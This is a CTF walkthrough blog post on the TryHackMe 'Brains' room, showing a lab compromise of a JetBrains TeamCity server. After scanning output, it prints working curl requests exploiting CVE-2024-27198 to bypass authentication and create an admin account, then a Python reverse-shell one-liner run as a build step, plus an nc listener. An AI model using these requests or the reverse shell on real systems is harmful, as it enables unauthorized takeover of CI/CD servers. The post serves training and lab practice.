---
title: 'TryHackMe: Brains CTF Walkthrough'
author: 0xcrax
categories: [TryHackMe]
tags: [web-application, rustscan, dirsearch, sed, curl, authentication-bypass, RCE, splunk]
render_with_liquid: true
img_path: /images/TryHackMe/Brains
image:
  path: /images/TryHackMe/Brains/room_image.webp
---

🧰 Writeup Overview

we focus on advanced paging, `directory obfuscation`, and `exploiting vulnerabilities within JetBrains TeamCity`. You will `bypass authentication` *(CVE-2024-27198)* and execute remote code *(CVE-2024-27199)* by sending crafted HTTP requests. The guide also covers setting up an admin user to execute commands and achieve reverse shell access, and we conclude with guidance on `using Splunk` to analyze incidents.

<a href="https://tryhackme.com/r/room/brains" target="_blank" class="box-button" data-mobile-text="Brains CTF Challenge | TryHackMe" style="display: flex; width: 100%; max-width: 1000px; align-items: center; justify-content: center; background: linear-gradient(135deg, #2a0e0e 0%, #1a0505 100%); padding: 15px 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3); color: #ff4444; text-decoration: none; font-family: Arial, sans-serif; font-weight: bold; border: 1px solid #ff5555; margin: 10px auto; transition: all 0.3s ease;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 0 25px rgba(255, 0, 0, 0.7)'; this.style.color='#ffffff';" onmouseout="this.style.transform='translateY(0px)'; this.style.boxShadow='0 4px 15px rgba(255, 0, 0, 0.3)'; this.style.color='#ff4444';">
<span>Brains CTF Challenge | TryHackMe</span>
<img src="/images/TryHackMe/THM.webp" alt="Icon" style="width: 48px; height: 48px; margin-right: 10px; filter: hue-rotate(300deg) brightness(0.9); transition: all 0.3s ease;" onmouseover="this.style.transform='scale(1.1)'; this.style.filter='hue-rotate(320deg) brightness(1.3)';" onmouseout="this.style.transform='scale(1)'; this.style.filter='hue-rotate(300deg) brightness(0.9)';">
</a>

## Red: Exploit the Server!
## Reconnaissance & Enumeration

### rustscan

**scanning ports**
```console
┌──(cracker㉿carcker)-[~/Desktop/THM/Brains]
└─$ rustscan -a brains.thm — range 1–65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] Host "—" could not be resolved.
[!] Host "range" could not be resolved.
[!] Host "1–65535" could not be resolved.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.113.153:22
Open 10.10.113.153:80
Open 10.10.113.153:8000
Open 10.10.113.153:8089
Open 10.10.113.153:8191
Open 10.10.113.153:33399
Open 10.10.113.153:50000
```

**Discovering services on server by rustscan & Nmap**
```console
┌──(cracker㉿carcker)-[~/Desktop/THM/Brains]
└─$ rustscan -a brains.thm -p 22,80,8000,8089,8191,33399,50000 -- -sCV -T4 -oN brains.nmap
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍
######################################################################################################
PORT      STATE SERVICE         REASON  VERSION
22/tcp    open  ssh             syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:7d:c0:d1:38:15:ac:33:5b:8b:ee:c4:b7:54:8b:f1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC99Mr5obEwtTb1vdHVPLvmU+fcnKpbio4PLfRBSLKtIV4JigV4L/PCKWCTVm8EJCpDT115OYye6m5DT19iXxxTtQ86h8M3BnmP+6tGIpgozstxBYAD19JTlfo8Bf7v5JeAKz9qIJyxR8G6sqYuGepgE+j7oCpYl7E6JQdl9Cx2BW2NQsUto+sP3DIIjtrYlS2XzgoKyURNQiajpEAu28C+J+GqFaFVH7OWR8gNazYhe5WKrzl2BYKha8uZbmzdBEl4irzhY1RFAI3I8rSXbLFFDywq7pZh7DjGevFSNcMMcVSVRKCc+7rCUvS3A9dQUyLwpyKOolZ/tP5o5k5Rd9VlQlA9wj9ssNFDUYWPaM+QIqMTbFweQ6/XUlku0H9IFapoyefMnjoCKCSZDHio997CVDGFgoFEQv5SUXdMl2Lev9g6oYAjdKy68DGhR0zwyf5ZA8FXUmXjP90wd9qrjwFunjoDYD3W1g/zOKpf++MrRAOOSTZbJX6ha9r3LiSQqe8=
|   256 51:82:9f:e0:f4:c2:1b:3e:99:27:5d:c3:2b:6e:84:96 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLaxJtjaMmCbeTb9TO/8UXngKvVDRc85X3t0EJlahicKXomPQo9yNs9fXBzN0SnNjSB98rjscnQzMwzhXZ3jiek=
|   256 ee:2d:22:3c:03:9f:7f:a9:99:b2:79:81:15:c8:72:bd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBDYqZEviTdiinUAqTPC93sbEm5JvfSWvwUafFJ5eCia
######################################################################################################
80/tcp    open  http            syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Maintenance
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
######################################################################################################
8000/tcp  open  http            syn-ack Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://brains.thm:8000/en-US/account/login?return_to=%2Fen-US%2F
|_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
######################################################################################################
8089/tcp  open  ssl/http        syn-ack Splunkd httpd (free license; remote login disabled)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-server-header: Splunkd
|_http-title: Site doesn't have a title (text/xml; charset=UTF-8).
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-04T21:42:22
| Not valid after:  2027-07-04T21:42:22
| MD5:   0b2d:eb62:377f:0eb1:9243:0a68:0106:83a0
| SHA-1: 86e5:d636:e659:9020:0090:d888:06f4:40c1:d823:868e
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQDY5dRkaGptyTANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0yNDA3MDQyMTQyMjJaFw0yNzA3MDQyMTQy
| MjJaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyM88
| am8rjZNYtOlBNB4OwH30JeyhjvEN6B5I6E8bu/FRjcwm8EcqE7GXn0YOiYeGwuFT
| +hqp4UCvxYjd0UlsBA3yNTtYT8gbxMZqq+UEDEhDmX5rFkp/yMNEE+UZ9teACFms
| JZx2bnHvHEbwjNKYgsM9vtIkkH4mqP7pkrzHZZgrB9tRiHgJDTrSGpbrLREs4rOC
| VD+7/N75ONKA7O92Ni5IBdpaJRS5J3nxvnZIrEEd44tKMQ9ZP3xXwSUbwh451S8t
| IvAof7dPhLQ132TpTS/YEVZlhQTnVISj2qio8RXtwLE2LfmISEEFJ2UvSd0OnjlE
| QD+OpXRn5OSpgUkrdwIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQC9KLb/6/OfyWn3
| nr4nR+D+T/bv/gFaurxQIq83ZebnzX4+Jkhbj2ilop/esR3+oXvLr86Zi+nS0yvo
| EkPthlwYkpE15Hx50jjZRsxnlE4lb459E/E83MJP5I9fkEisZbS7O6s/vdqtaiRK
| eBaSL00lgtBd6mKbXJ5SzCu6eKBSWKhd+Iirw0WfbfiAhFyPXZd7pSsTGfLrT28G
| GDbWjpq9qRJTn9VWctS2WMeN7HAGU/m8AInubxxI3/zxlFSN336ffYkNU9T9QQ+I
| d/P3uF2hKyyqbIWjFDAnY08DzdcnkZZZ810fzGbJUp2OzbZSdOafK4Fmz8mxItVG
| DAxAAX0B
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8191/tcp  open  limnerpressure? syn-ack
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|_    looks like you are trying to access MongoDB over HTTP on the native driver port.
######################################################################################################
33399/tcp open  java-rmi        syn-ack Java RMI
######################################################################################################
50000/tcp open  ibm-db2?        syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 401 
|     TeamCity-Node-Id: MAIN_SERVER
|     WWW-Authenticate: Basic realm="TeamCity"
|     WWW-Authenticate: Bearer realm="TeamCity"
|     Cache-Control: no-store
|     Content-Type: text/plain;charset=UTF-8
|     Date: Sat, 05 Oct 2024 15:16:38 GMT
|     Connection: close
|     Authentication required
|     login manually go to "/login.html" page
|   drda: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sat, 05 Oct 2024 15:16:41 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|     Request</h1></body></html>
|   ibm-db2, ibm-db2-das: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sat, 05 Oct 2024 15:16:39 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
######################################################################################################
```

### Discovering The web-application

port `80`

![](/images/TryHackMe/Brains/Maintenance.png)
as you see the service under Maintenance

port `50000`

![](/images/TryHackMe/Brains/TeamCity.png)
We can benefit from the release TeamCity `Version 2023.11.3` 

> After Fuzzing Into server directories on ports `80`,`50000` we don't found any things interested.
{: .prompt-info }

```console
dirsearch -u http://brains.thm/ -w /usr/share/dirb/wordlists/big.txt  -t 100
```
![](/images/TryHackMe/Brains/dirsearch-brains-80.png)

```console
dirsearch -u http://brains.thm:50000/ -w /usr/share/dirb/wordlists/big.txt  -t 100
```
![](/images/TryHackMe/Brains/dirsearch-brains-50000.png)

## Exploit

After searching for vulnerabilities in version `2023.11.3`, we found that this version is affected by the CVES vulnerability `CVE-2024-27198` && `CVE-2024-27199`.

The vulnerabilities CVE-2024-27198 and CVE-2024-27199 target `JetBrains TeamCity`, a popular `CI/CD tool`. Here's the breakdown:

- `CVE-2024-27198` (`Auth Bypass`): Exploiting this flaw lets attackers bypass authentication by `manipulating API requests`. By leveraging `unsecured endpoints`, they gain unauthorized access.

- `CVE-2024-27199` (`RCE`): Once authenticated, either legitimately or through bypass, an attacker can execute arbitrary code on the TeamCity server, `leading to full compromise of the system`.

This combo is powerful—auth bypass lets attackers reach an interface, and RCE takes it further to control the server.

### Manual Exploitation Approach

JetBrains TeamCity Multiple Authentication Bypass Vulnerabilities (FIXED)

<a href="https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/" target="_blank" class="box-button" data-mobile-text="CVE-2024-27198 & CVE-2024-27199 | Rapid7 Blog" style="display: flex; width: 100%; max-width: 1000px; align-items: center; justify-content: center; background: linear-gradient(135deg, #2a2a2a 100%, #2a2a2a 100%); padding: 15px 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4); color: #a1a1a1; text-decoration: none; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: 600; border: 2px solid #404040; margin: 10px auto; transition: all 0.3s ease;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 0 20px rgba(255, 255, 255, 0.3)'; this.style.borderColor='#666';" onmouseout="this.style.transform='translateY(0px)'; this.style.boxShadow='0 4px 15px rgba(0, 0, 0, 0.4)'; this.style.borderColor='#404040';">
<span>CVE-2024-27198 and CVE-2024-27199: JetBrains TeamCity Multiple Authentication Bypass Vulnerabilities (FIXED) | Rapid7 Blog</span>
<img src="https://www.rapid7.com/includes/img/favicon.ico" alt="Icon" style="width: 48px; height: 48px; margin-right: 10px; transition: all 0.3s ease; filter: brightness(0.8);" onmouseover="this.style.transform='scale(1.1)'; this.style.filter='brightness(1.2)';" onmouseout="this.style.transform='scale(1)'; this.style.filter='brightness(0.8)';">
</a>

A detailed explanation of `CVE-2024-27198` and `CVE-2024-27199` can be found here:

<a href="https://www.vicarius.io/vsociety/posts/teamcity-auth-bypass-to-rce-cve-2024-27198-and-cve-2024-27199" target="_blank" class="box-button" data-mobile-text="TeamCity Auth bypass to RCE | Vicarius" style="display: flex; width: 100%; max-width: 1000px; align-items: center; justify-content: center; background: linear-gradient(135deg, #2a2a2a 100%, #2a2a2a 100%); padding: 15px 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4); color: #a1a1a1; text-decoration: none; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: 600; border: 2px solid #404040; margin: 10px auto; transition: all 0.3s ease;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 0 20px rgba(255, 255, 255, 0.3)'; this.style.borderColor='#666';" onmouseout="this.style.transform='translateY(0px)'; this.style.boxShadow='0 4px 15px rgba(0, 0, 0, 0.4)'; this.style.borderColor='#404040';">
<span>TeamCity Auth bypass to RCE | Vicarius</span>
<img src="https://www.vicarius.io/vsociety/favicon.svg" alt="Icon" style="width: 48px; height: 48px; margin-right: 10px; transition: all 0.3s ease; filter: brightness(0.8);" onmouseover="this.style.transform='scale(1.1)'; this.style.filter='brightness(1.2)';" onmouseout="this.style.transform='scale(1)'; this.style.filter='brightness(0.8)';">
</a>

```console
curl -ik http://brains.thm:50000/app/rest/server
```
output
```console
HTTP/1.1 401 
TeamCity-Node-Id: MAIN_SERVER
WWW-Authenticate: Basic realm="TeamCity"
WWW-Authenticate: Bearer realm="TeamCity"
Cache-Control: no-store
Content-Type: text/plain;charset=UTF-8
Transfer-Encoding: chunked
Date: Fri, 25 Oct 2024 11:43:57 GMT

Authentication required
To login manually go to "/login.html" page 
```

> `-i` (Include HTTP headers in the output) & `-k` (Disable SSL verification)
{: .prompt-info }

Typically, this endpoint requires authentication, meaning direct requests by unauthenticated users will be blocked.

now will bypass Authentication as below :
```console
curl -s 'http://brains.thm:50000/any?jsp=/app/rest/server;.jsp'
```
However, to manipulate this system using the vulnerability, an unauthenticated attacker needs to fulfill three specific criteria during their HTTP(S) request:

1. Initiate a request that generates a 404 error: This can be done by targeting a nonexistent resource.
2. Include an HTTP query parameter named '`jsp`' with the value set to an authenticated endpoint's URI path. This is done by adding a query.
3. Ensure the '`jsp`' parameter ends with `.jsp`, mimicking the file format. This can be implemented by appending an HTTP path parameter.

When these elements are combined, the manipulated request looks like this: `/any?jsp=/app/rest/server;.jsp`. Let's check what happens when we call this endpoint (I use "xml_pp" to pretty print the XML response):

```console
curl -s 'http://brains.thm:50000/kaka?jsp=/app/rest/server;.jsp' | xml_pp
```
output
```console
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<server artifactsUrl="" buildDate="20240129T000000+0000" buildNumber="147512" currentTime="20241025T121938+0000" internalId="dfe695de-193a-4379-aa85-1757839c83f0" role="main_node" startTime="20241025T121111+0000" version="2023.11.3 (build 147512)" versionMajor="2023" versionMinor="11" webUrl="http://brains.thm:50000">
  <projects href="/app/rest/projects"/>
  <vcsRoots href="/app/rest/vcs-roots"/>
  <builds href="/app/rest/builds"/>
  <users href="/app/rest/users"/>
  <userGroups href="/app/rest/userGroups"/>
  <agents href="/app/rest/agents"/>
  <buildQueue href="/app/rest/buildQueue"/>
  <agentPools href="/app/rest/agentPools"/>
  <investigations href="/app/rest/investigations"/>
  <mutes href="/app/rest/mutes"/>
  <nodes href="/app/rest/server/nodes"/>
</server>
```
By following these steps, the attacker can access the authenticated endpoint (`/app/rest/server`) without needing to authenticate, effectively bypassing security through this vulnerability.

This authentication bypass vulnerability can be exploited in various ways, enabling an attacker to seize control of a vulnerable TeamCity server and, consequently, all related projects, builds, agents, and artifacts. For instance, an unauthenticated attacker can establish a new administrator user with a password of their choosing by exploiting the `/app/rest/users` REST API endpoint:

```console
curl -ik 'http://brains.thm:50000/kaka?jsp=/app/rest/users;.jsp' -X POST -H "Content-Type: application/json" --data '{"username": "0xcracker", "password": "0xcracker", "email": "vsociety", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}'
```

output
```console
HTTP/1.1 200 
TeamCity-Node-Id: MAIN_SERVER
Cache-Control: no-store
Content-Type: application/xml;charset=ISO-8859-1
Content-Language: en
Content-Length: 672
Date: Fri, 25 Oct 2024 11:45:33 GMT

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><user username="0xcracker" id="21" email="vsociety" href="/app/rest/users/id:21"><properties count="3" href="/app/rest/users/id:21/properties"><property name="addTriggeredBuildToFavorites" value="true"/><property name="plugin:vcs:anyVcs:anyVcsRoot" value="0xcracker"/><property name="teamcity.server.buildNumber" value="147512"/></properties><roles><role roleId="SYSTEM_ADMIN" scope="g" href="/app/rest/users/id:21/roles/SYSTEM_ADMIN/g"/></roles><groups count="1"><group key="ALL_USERS_GROUP" name="All Users" href="/app/rest/userGroups/key:ALL_USERS_GROUP" description="Contains all TeamCity users"/></groups></user>
```

Now we will use credentials that we created or in other words, the user we added.

![](/images/TryHackMe/Brains/1.png)

![](/images/TryHackMe/Brains/2.png)

then...

`Arbitrary Command Execution by Custom Script`
- Login as admin user.

- Create a new project in admin dashboard.

- Click "Manual" tab and fill required fields.

- A new project is created.

- In the project home, create a Build Configurations.

- In the build configuration page, click "Build Steps" on the left menus.

- Add build step.

- Select "Command Line" in Runner type.

- Put a Python reverse shell script in the "Custom script".

```py
export RHOST="<local-ip>";export RPORT=<local-port>;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
- Start listener in local machine.
```sh
nc -lvnp 4444
```
- Click "Run" button in the build page.

- We should get a shell in terminal.

### Automated Exploitation Approach

CVE-2024-27198 & CVE-2024-27199 Authentication Bypass

<a href="https://github.com/W01fh4cker/CVE-2024-27198-RCE" target="_blank" class="box-button" data-mobile-text="RCE in JetBrains TeamCity Pre-2023.11.4 | github" style="display: flex; width: 100%; max-width: 1000px; align-items: center; justify-content: center; background: linear-gradient(135deg, #2a2a2a 100%, #2a2a2a 100%); padding: 15px 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4); color: #a1a1a1; text-decoration: none; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: 600; border: 2px solid #404040; margin: 10px auto; transition: all 0.3s ease;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 0 20px rgba(255, 255, 255, 0.3)'; this.style.borderColor='#666';" onmouseout="this.style.transform='translateY(0px)'; this.style.boxShadow='0 4px 15px rgba(0, 0, 0, 0.4)'; this.style.borderColor='#404040';">
<span>CVE-2024-27198 & CVE-2024-27199 Authentication Bypass --> RCE in JetBrains TeamCity Pre-2023.11.4 | github</span>
<img src="https://github.githubassets.com/favicons/favicon.png" alt="Icon" style="width: 48px; height: 48px; margin-right: 10px; transition: all 0.3s ease; filter: brightness(0.8);" onmouseover="this.style.transform='scale(1.1)'; this.style.filter='brightness(1.2)';" onmouseout="this.style.transform='scale(1)'; this.style.filter='brightness(0.8)';">
</a>

<!-- -->
Use `Firefox browser` if you have trouble playing the video.

<div class="video-container">
  <video controls class="video-responsive">
    <source src="{{ '/videos/TryHackMe/brains/Automated_Exploitation.mp4' | relative_url }}" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>
{: .video-responsive }


## Blue: Let's Investigate

you can check here about how use Splunk

<a href="https://docs.splunk.com/Documentation/Splunk" target="_blank" class="box-button" data-mobile-text="Usage Splunk | Splunk® Enterprise" style="display: flex; width: 100%; max-width: 1000px; align-items: center; justify-content: center; background: linear-gradient(135deg, #2a2a2a 100%, #2a2a2a 100%); padding: 15px 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4); color: #a1a1a1; text-decoration: none; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: 600; border: 2px solid #404040; margin: 10px auto; transition: all 0.3s ease;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 0 20px rgba(255, 255, 255, 0.3)'; this.style.borderColor='#666';" onmouseout="this.style.transform='translateY(0px)'; this.style.boxShadow='0 4px 15px rgba(0, 0, 0, 0.4)'; this.style.borderColor='#404040';">
<span>Usage Splunk | Splunk® Enterprise</span>
<img src="https://docs.splunk.com/favicon.ico" alt="Icon" style="width: 48px; height: 48px; margin-right: 10px; transition: all 0.3s ease; filter: brightness(0.8);" onmouseover="this.style.transform='scale(1.1)'; this.style.filter='brightness(1.2)';" onmouseout="this.style.transform='scale(1)'; this.style.filter='brightness(0.8)';">
</a>

<div class="video-container">
  <video controls class="video-responsive">
    <source src="{{ '/videos/TryHackMe/brains/Investigate.mp4' | relative_url }}" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>
{: .video-responsive }

<div class="gif-container">
<img src="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExd3dzNjZwZ2V3ZDFmZmRiZnNmZXdhc3hnMzFzMm1tYTBreXhiM3RzNSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/1xucXbDnMIYkU/giphy.gif" alt="GIF" class="gif-responsive">
</div>

---

<style>
img {
  transition: all 0.3s ease;
}

img:hover {
  transform: scale(1.05);
  filter: brightness(90%);
  box-shadow: 0 15px 35px rgba(0, 0, 0, 0);
}

img:center {
  display: block;
  margin-left: auto;
  margin-right: auto;
}

.wrap pre {
  white-space: pre-wrap;
}

.gif-container {
    text-align: center;
    margin: 30px 0;
}

.gif-responsive {
    width: 100%;
    max-width: 800px;
    height: 450px;
    border-radius: 12px;
    object-fit: cover;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0);
    transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.gif-responsive:hover {
    transform: scale(1.02);
    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
}

/* Additional video styles */
.video-container {
  text-align: center;
  margin: 30px auto;        /* centers inside post */
  max-width: 800px;         /* keeps container from being huge */
}

.video-responsive {
  width: 100%;              /* fill container */
  aspect-ratio: 16 / 9;    /* keeps correct proportions on desktop */
  border-radius: 12px;
  object-fit: cover;
  box-shadow: 0 10px 25px rgba(0.1, 0.1, 0, 0.1);
  transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.video-responsive:hover {
  transform: scale(1.02);
  box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
}

/* Mobile Responsive Styles */
@media screen and (max-width: 768px) {
    .gif-responsive {
    width: 100% !important;
    max-width: 100% !important;
    height: auto !important;
  }

  .video-responsive {
    width: 100% !important;
    max-width: 100% !important;
    aspect-ratio: auto;  /* let phone use natural aspect ratio */
    height: auto !important;
  }
  
  .box-button {
    max-width: 100% !important;
    width: 100% !important;
    padding: 10px 14px !important;
    justify-content: center !important;
    gap: 6px !important;
    position: relative;
  }
  /* Hide desktop text on mobile */
  .box-button span {
    display: none !important;
  }

  /* Show mobile text from data attribute */
  .box-button::after {
    content: attr(data-mobile-text) !important;
    font-size: 10px !important;
    text-align: center !important;
    white-space: nowrap !important;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important;
    font-weight: 1000 !important;
  }

      /* DEFAULT: Use #a1a1a1 for most buttons */
    .box-button::after {
      color: #a1a1a1 !important;
    }

    /* Specific color overrides for each button style */
    
    /* CYBER BLUE NEON - Blue text */
    .box-button[style*="color: #00ccff"]::after,
    .box-button[style*="color:#00ccff"]::after {
      color: #00ccff !important;
    }

    /* HACKER GREEN TERMINAL - Green text */
    .box-button[style*="color: #00ff88"]::after,
    .box-button[style*="color:#00ff88"]::after {
      color: #00ff88 !important;
    }

    /* PURPLE NEON LIGHT - Purple text */
    .box-button[style*="color: #cc00ff"]::after,
    .box-button[style*="color:#cc00ff"]::after {
      color: #cc00ff !important;
    }

    /* RED ALERT GLOW - Red text (#ff4444) */
    .box-button[style*="color: #ff4444"]::after,
    .box-button[style*="color:#ff4444"]::after,
    .box-button[style*="color: #ff5555"]::after,
    .box-button[style*="color:#ff5555"]::after {
      color: #ff4444 !important;
    }

    /* ORANGE SUNLIGHT - Orange text */
    .box-button[style*="color: #ffaa00"]::after,
    .box-button[style*="color:#ffaa00"]::after {
      color: #ffaa00 !important;
    }

    /* MINIMAL LIGHT SHINE - Dark text for light background */
    .box-button[style*="background: #ffffff"]::after,
    .box-button[style*="background:#ffffff"]::after,
    .box-button[style*="color: #333333"]::after,
    .box-button[style*="color:#333333"]::after {
      color: #333333 !important;
    }

    /* TEAL CYBER GLOW - Teal text */
    .box-button[style*="color: #5eead4"]::after,
    .box-button[style*="color:#5eead4"]::after {
      color: #5eead4 !important;
    }

    /* PINK NEON LIGHT - Pink text */
    .box-button[style*="color: #f9a8d4"]::after,
    .box-button[style*="color:#f9a8d4"]::after {
      color: #f9a8d4 !important;
    }

    /* FOREST GREEN LIGHT - Lime text */
    .box-button[style*="color: #bef264"]::after,
    .box-button[style*="color:#bef264"]::after {
      color: #bef264 !important;
    }

    /* DARK RED WINE GLOW - Light red text */
    .box-button[style*="color: #fecaca"]::after,
    .box-button[style*="color:#fecaca"]::after {
      color: #fecaca !important;
    }

    /* LIGHT BLUE SKY SHINE - Blue text */
    .box-button[style*="color: #1e40af"]::after,
    .box-button[style*="color:#1e40af"]::after {
      color: #1e40af !important;
    }

    /* DARK ORANGE GLOW - Orange text */
    .box-button[style*="color: #fdba74"]::after,
    .box-button[style*="color:#fdba74"]::after {
      color: #fdba74 !important;
    }

    /* CYBER YELLOW - Yellow text */
    .box-button[style*="color: #fef08a"]::after,
    .box-button[style*="color:#fef08a"]::after {
      color: #fef08a !important;
    }

    /* DEEP SPACE - Purple text */
    .box-button[style*="color: #9370db"]::after,
    .box-button[style*="color:#9370db"]::after {
      color: #9370db !important;
    }

    /* ELECTRIC PINK - Pink text */
    .box-button[style*="color: #e879f9"]::after,
    .box-button[style*="color:#e879f9"]::after {
      color: #e879f9 !important;
    }

    /* LAVA RED - Light red text */
    .box-button[style*="color: #fca5a5"]::after,
    .box-button[style*="color:#fca5a5"]::after {
      color: #fca5a5 !important;
    }

    /* AQUA MARINE - Teal text */
    .box-button[style*="color: #99f6e4"]::after,
    .box-button[style*="color:#99f6e4"]::after {
      color: #99f6e4 !important;
    }

    /* ROYAL PURPLE - Light purple text */
    .box-button[style*="color: #d8b4fe"]::after,
    .box-button[style*="color:#d8b4fe"]::after {
      color: #d8b4fe !important;
    }

    /* EMERALD GREEN - Green text */
    .box-button[style*="color: #6ee7b7"]::after,
    .box-button[style*="color:#6ee7b7"]::after {
      color: #6ee7b7 !important;
    }

    /* MIDNIGHT BLUE - Light blue text */
    .box-button[style*="color: #93c5fd"]::after,
    .box-button[style*="color:#93c5fd"]::after {
      color: #93c5fd !important;
    }

    /* Light backgrounds with colored text - use original colors */
    .box-button[style*="background: linear-gradient(135deg, #fef3c7"]::after,
    .box-button[style*="background: linear-gradient(135deg, #fde68a"]::after,
    .box-button[style*="background: linear-gradient(135deg, #f8fafc"]::after,
    .box-button[style*="background: linear-gradient(135deg, #dbeafe"]::after,
    .box-button[style*="background: linear-gradient(135deg, #bfdbfe"]::after {
      color: #333333 !important; /* Dark text for better contrast on light backgrounds */
    }

  .box-button img {
